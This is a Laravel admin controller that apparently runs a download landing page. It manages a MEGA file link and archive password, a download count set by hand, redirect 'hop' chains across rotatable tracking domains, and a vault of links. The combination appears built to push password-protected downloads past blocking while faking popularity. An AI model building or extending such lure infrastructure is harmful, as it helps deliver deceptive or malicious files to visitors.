<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\LanderHop;
use App\Models\LanderSetting;
use App\Models\MegaUrl;
use App\Models\TrackingDomain;
use Illuminate\Http\Request;

class LanderController extends Controller
{
    public function index()
    {
        $settings = LanderSetting::current();
        $settings->load('activeLanderDomain');
        $hops            = LanderHop::with('domain')->orderBy('position')->get();
        $megaUrls        = MegaUrl::orderByDesc('created_at')->get();
        $trackingDomains = TrackingDomain::orderByDesc('is_active')->orderBy('domain')->get();

        return view('admin.lander.index', compact('settings', 'hops', 'megaUrls', 'trackingDomains'));
    }

    public function update(Request $request)
    {
        $data = $request->validate([
            'mega_url'         => 'nullable|string|max:2000',
            'archive_password' => 'nullable|string|max:100',
            'color_scheme'     => 'required|in:dark-red,dark-blue,dark-green,dark-purple,neon-cyan,amber-gold',
            'page_title'       => 'required|string|max:200',
            'download_count'   => 'required|integer|min:0',
            'show_password'    => 'sometimes|boolean',
            'show_checks'      => 'sometimes|boolean',
        ]);

        $data['show_password'] = $request->boolean('show_password');
        $data['show_checks']   = $request->boolean('show_checks');

        LanderSetting::current()->update($data);

        return back()->with('success', 'Lander settings saved successfully.');
    }

    public function setActiveDomain(Request $request)
    {
        $request->validate(['domain_id' => 'required|exists:tracking_domains,id']);

        LanderSetting::current()->update(['active_lander_domain_id' => $request->domain_id]);

        $domain = TrackingDomain::find($request->domain_id);
        return back()->with('success', "Active lander domain switched to {$domain->domain}. All redirect chains now point here.");
    }

    // ── Favicon upload ────────────────────────────────────────────────────

    public function uploadFavicon(Request $request)
    {
        $request->validate([
            'favicon' => 'required|file|max:512|mimetypes:image/x-icon,image/vnd.microsoft.icon',
        ]);

        $uploadDir = public_path('uploads');
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0755, true);
        }

        // Delete old file if exists
        $settings = LanderSetting::current();
        if ($settings->favicon_path && file_exists(public_path($settings->favicon_path))) {
            unlink(public_path($settings->favicon_path));
        }

        $request->file('favicon')->move($uploadDir, 'lander-favicon.ico');
        $settings->update(['favicon_path' => 'uploads/lander-favicon.ico']);

        return back()->with('success', 'Lander favicon updated.');
    }

    public function deleteFavicon()
    {
        $settings = LanderSetting::current();
        if ($settings->favicon_path && file_exists(public_path($settings->favicon_path))) {
            unlink(public_path($settings->favicon_path));
        }
        $settings->update(['favicon_path' => null]);

        return back()->with('success', 'Favicon removed. Lander page will show no icon.');
    }

    // ── Hop chain management ──────────────────────────────────────────────

    public function addHop(Request $request)
    {
        $request->validate(['domain_id' => 'required|exists:tracking_domains,id']);

        $maxPosition = LanderHop::max('position') ?? -1;

        LanderHop::create([
            'code'      => LanderHop::generateCode(),
            'domain_id' => $request->domain_id,
            'position'  => $maxPosition + 1,
        ]);

        return back()->with('success', 'Hop added to chain.');
    }

    public function deleteHop(LanderHop $hop)
    {
        $position = $hop->position;
        $hop->delete();

        // Close the gap — decrement all positions above deleted hop
        LanderHop::where('position', '>', $position)
            ->decrement('position');

        return back()->with('success', 'Hop removed from chain.');
    }

    public function clearChain()
    {
        LanderHop::truncate();

        return back()->with('success', 'Redirect chain cleared.');
    }

    public function rotateHopCode(LanderHop $hop)
    {
        $hop->update(['code' => LanderHop::generateCode()]);

        return back()->with('success', 'Hop code rotated. Update any shared URLs using this hop.');
    }

    // ── MEGA URL vault ────────────────────────────────────────────────────

    public function storeMegaUrl(Request $request)
    {
        $data = $request->validate([
            'nickname' => 'required|string|max:100',
            'url'      => 'required|string|max:2000',
            'notes'    => 'nullable|string|max:500',
        ]);

        MegaUrl::create($data);

        return back()->with('success', 'MEGA URL saved to vault.');
    }

    public function destroyMegaUrl(MegaUrl $megaUrl)
    {
        $megaUrl->delete();

        return back()->with('success', 'URL removed from vault.');
    }

    public function useMegaUrl(MegaUrl $megaUrl)
    {
        LanderSetting::current()->update(['mega_url' => $megaUrl->url]);

        return back()->with('success', "Now using \"{$megaUrl->nickname}\" as the active MEGA link.");
    }
}
